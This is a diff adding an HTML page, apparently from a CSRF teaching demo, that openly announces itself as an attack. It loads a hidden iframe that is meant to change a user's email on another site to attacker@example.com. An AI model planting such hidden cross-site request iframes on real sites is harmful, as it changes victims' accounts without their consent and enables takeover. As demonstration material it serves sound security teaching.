@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Malicious CSRF Attack</title>
+</head>
+<body>
+    <h1>CSRF Attack!</h1>
+    <p>If you are seeing this, a CSRF attack is being performed using an iframe.</p>
+    <p>By acessing this page the email has been changed in another website using a hidden iFrame to attacker@example.com</p>
+    <p>Go back and update the change email page to see that it updated the email without your permission</p>
+    <!-- Hidden iframe that will load the CSRF form -->
+    <iframe src="iframe_attack.html" style="display: none;"></iframe>
+
+</body>
+</html>
